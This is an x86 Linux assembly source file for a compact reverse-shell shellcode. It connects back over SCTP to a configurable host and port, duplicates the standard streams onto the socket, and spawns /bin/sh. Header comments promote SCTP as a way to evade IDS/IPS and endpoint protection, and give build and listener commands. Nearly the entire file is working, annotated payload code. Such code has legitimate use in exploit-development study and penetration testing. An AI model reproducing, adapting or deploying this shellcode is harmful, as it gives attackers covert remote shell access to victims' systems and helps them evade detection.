; lnx-connback-sctp-execve-x86_32.s
; This linux (x86) 83-bytes shellcode connect back to 127.127.127.1 on sctp/31337
; It redirect stdin, stdout and stderr to the new socket connection and spawn a
; '/bin/sh' shell without privileges restoration. It uses SCTP as the
; transport-layer protocol, how cool is that? At this time of writting SCTP is
; well supported by most linux distributions, and can be used to evade some
; detection mechanisms such as IDS/IPS, endpoint protections and even
; inadvertent users ;-)
;
; WARNING: this shellcode doesn't exit() when it cannot connect back, therefore
; it can leave log traces due to the process segmentation fault.
;
; Written by e3prom (github.com/e3prom)
;
; To assemble a 32-bits ELF executable: 
; nasm -f elf32 lnx-connback-sctp-execve-x86_32.s
; ld -m elf_i386 lnx-connback-sctp-execve-x86_32.o -o lnx-connback-sctp-execve-x86_32
; ./lnx-connback-sctp-execve-x86_32
; socat SCTP-LISTEN:31337,reuseaddr,fork -
BITS 32

; int socket(int domain, int type, int protocol);
  push BYTE 0x66        ; socketcall(int call, unsigned long *args) (#102);
  pop eax               ; pop DWORD above to EAX for later system call.
  cdq                   ; zero out EDX.
  mov dl, 0x84          ; set the DL register to decimal 132 (SCTP).
  xor ebx, ebx          ; socketcall()'s first argument.
  inc ebx               ; socketcall's call nbr 1 (SYS_SOCKET).
  push edx              ; socketcall()'s 3rd arg. array (reversed): { protocol = 132 (SCTP),
  push BYTE 0x1         ;                                             type = 1 (SOCK_STREAM),
  push BYTE 0x2         ;                                             domain = 2 (AF_INET) }
  mov ecx, esp          ; ECX = pointer to socketcall()'s 3rd argument array.
  int 0x80              ; interrupt vector 0x80.
  xchg esi, eax         ; copy the returned socket's file descriptor to ESI for later use.

; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  push BYTE 0x66        ; push socketcall() (syscall #102) into the stack.
  pop eax               ; pop DWORD above to EAX for later system call.
  inc ebx               ; increase EBX, previously 1 to becomes 2 (AF_INET).
                        ; python -c 'import socket; import struct; print(hex(struct.unpack("<L", socket.inet_aton("127.127.127.1"))[0]))'
  push DWORD 0x17f7f7f  ; sockaddr structure (reversed): LHOST = 127.127.127.1
  push WORD 0x697a      ;                                PORT = 31337
  push WORD bx          ;                                AF_INET = 2
  mov ecx, esp          ; copy stack pointer address to ECX, so ECX points to the above structure.
  push BYTE 16          ; push 16 onto the stack which is addrlen = sizeof(struct sockaddr).
  push ecx              ; push struct's pointer onto the stack.
  push esi              ; push saved socket's FD onto the stack.
  mov ecx, esp          ; ECX now points to the bind's argument array.
  inc ebx               ; Increment EBX previously at 2 to become 3 = SYS_CONNECT = connect().
  int 0x80              ; interrupt vector 0x80.
 
; int dup2(int oldfd, int newfd);
  mov ebx, esi          ; copy the saved socket's FD to EBX.
  push BYTE 0x2         ; push 2 onto the stack.
  pop ecx               ; pop the value 2 from the stack to ECX.
dup2_loop:
  mov BYTE al, 0x3F     ; dup2 (syscall #63)
  int 0x80              ; interrupt vector 0x80 - dup2(oldfd, 2);
  dec ecx               ; decrease ECX to be used as both a counter and arg.
  jns dup2_loop         ; jump to the start of the loop until ECX < 0 OR become negative (signed).

; int execve(const char *filename, char *const argv[], char *const envp[]);
  mov BYTE al, 0x0b     ; execve() (syscall #11)
  cdq                   ; zero out EDX because we used it above.
  push edx              ; EDX should be NULL, here used as a string terminator.
  push 0x68732f2f       ; push '//sh' onto the stack.
  push 0x6e69622f       ; push '/bin' onto the stack.
  mov ebx, esp          ; EBX now points to the filename string.
  xor ecx, ecx          ; warning: ECX should be zero out.
  push ecx              ; Push actual content of ECX onto the stack.
  mov edx, esp          ; EDX now points to the bogus environement array. 
  push ebx              ; Push content of EBX which hold the memory address of the filename string.
  mov ecx, esp          ; ECX now points to the argument vector array.
  int 0x80              ; interrupt vector 0x80 - execve('/bin//sh', ['/bin//sh', 'NULL'], [NULL])
